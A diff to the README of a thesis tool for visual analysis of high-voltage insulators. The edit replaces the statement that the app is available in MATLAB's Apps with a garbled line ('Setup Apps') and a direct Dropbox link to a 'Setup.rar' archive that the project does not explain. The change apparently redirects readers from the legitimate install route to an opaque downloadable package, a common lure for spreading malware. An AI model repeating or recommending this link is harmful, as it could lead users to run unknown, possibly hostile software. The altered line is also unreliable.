@@ -1,6 +1,8 @@
 # HV_InsulatorAnalysis_tool
 A tool for visual analysis of High Voltage Insulators from test videos
-This app can be found in MATLAB's Apps and install it on your personal computer
+This app can be found in Setup Apps and install it on your personal computer
+Download Link : https://www.dropbox.com/scl/fi/v29hnzx2coqz2wtz9ub4p/Setup.rar?rlkey=4clgo5rul7ynd4wu1e9zr0iae&dl=1
+
 This is a final year thesis for my bachelor's degree in Electrical & Electronic Engineering. I have received an award and also i have published my thesis at the conference UPEC2020.
 The abstract can be read below and attached it's also the published paper.
 
